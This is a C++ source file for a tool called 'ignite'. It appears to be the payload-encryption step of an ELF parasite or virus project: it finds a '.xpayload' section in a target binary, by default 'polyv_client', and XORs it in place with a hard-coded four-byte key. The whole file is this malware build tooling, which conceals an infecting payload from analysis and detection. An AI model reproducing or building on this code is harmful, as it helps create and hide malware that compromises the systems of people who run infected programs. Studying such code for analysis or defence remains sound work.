
#include <iostream>

#include <elf.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_usage() {
    printf("Ignite parassite code with first encryption     \n");
    printf("usage:                                          \n");
    printf("  ignite <target>                               \n");
}

unsigned char global_key[] = { 0xDE, 0xAD, 0xBE, 0xEF };

void encrypt_section(FILE* file, size_t offset, size_t size, unsigned char* key, size_t key_size) {

    // Load section data
    fseek(file, offset, SEEK_SET);
    unsigned char* section = (unsigned char*)malloc(size);
    if (fread(section, 1, size, file) <= 0) {
        // ERROR: TODO
        return;
    }

    // Encrypt using key
    size_t key_i = 0;
    for(size_t i = 0; i < size; i++, key_i = (key_i + 1) % key_size)
        section[i] = section[i] ^ key[key_i];

    // Write encrypted section
    fseek(file, offset, SEEK_SET);
    if (fwrite(section, 1, size, file) <= 0) {
        // ERROR: TODO
        return;
    }
}

/// Encrypt xpayload section, generic over elf types for 32 and 64 bits
template<typename Ehdr, typename Shdr>
void encrypt_hdr(FILE* file) {

    Ehdr ehdr;
    Shdr nhdr;

    // Read ELF header
    fseek(file, 0, SEEK_SET);
    if (fread(&ehdr, 1, sizeof(Ehdr), file) <= 0) {
        // ERROR: TODO
        return;
    }

    // Read the section header names
    const size_t shdr_offset = ehdr.e_shoff + (ehdr.e_shstrndx * ehdr.e_shentsize);
    fseek(file, shdr_offset, SEEK_SET);
    if (fread(&nhdr, 1, sizeof(Shdr), file) <= 0) {
        // ERROR: TODO
        return;
    }

    // Read all section names
    fseek(file, nhdr.sh_offset, SEEK_SET);
    char* names = (char*)malloc(nhdr.sh_size);
    if (fread(names, 1, nhdr.sh_size, file) <= 0) {
        // ERROR: TODO
        return;
    }

    // Find xpayload section
    size_t i;
    for (i = 0; i < ehdr.e_shnum; i++) {
        const size_t sec_offset = ehdr.e_shoff + (i * ehdr.e_shentsize); 
        fseek(file, sec_offset, SEEK_SET);

        Shdr shdr;
        if (fread(&shdr, 1, sizeof(Shdr), file) <= 0) {
            // ERROR: TODO
            return;
        }

        // Encrypt if we found the xpayload section
        if (strcmp(names + shdr.sh_name, ".xpayload") == 0) {
            printf("Found xpayload section, encrypting... ");
            encrypt_section(file, shdr.sh_offset, shdr.sh_size, global_key, 4);
            printf("DONE\n");
            break;
        }
    }

    free(names);
}

int main(int argc, char** argv) {

    const char* target = "../client/polyv_client";
    if (argc == 2)
        target = argv[1];

    FILE* file = fopen(target, "r+");
    if (file == nullptr) {
        printf("Target file is not valid!\n");
        print_usage();
        return -1;
    }

    Elf32_Ehdr ehdr32;
    if (fread(&ehdr32, 1, sizeof(Elf32_Ehdr), file) <= 0) {
        printf("Target file is not valid!\n");
        return -1;
    }

    // Check if ELF file is valid
    if (ehdr32.e_ident[0] != 0x7f || ehdr32.e_ident[1] != 'E'  || 
        ehdr32.e_ident[2] != 'L'  || ehdr32.e_ident[3] != 'F') {

        printf("Target file is not a valid ELF file!\n");
        return -1;
    }

    if (ehdr32.e_ident[EI_CLASS] == 1)
        encrypt_hdr<Elf32_Ehdr, Elf32_Shdr>(file);
    else
        encrypt_hdr<Elf64_Ehdr, Elf64_Shdr>(file);

    fclose(file);
}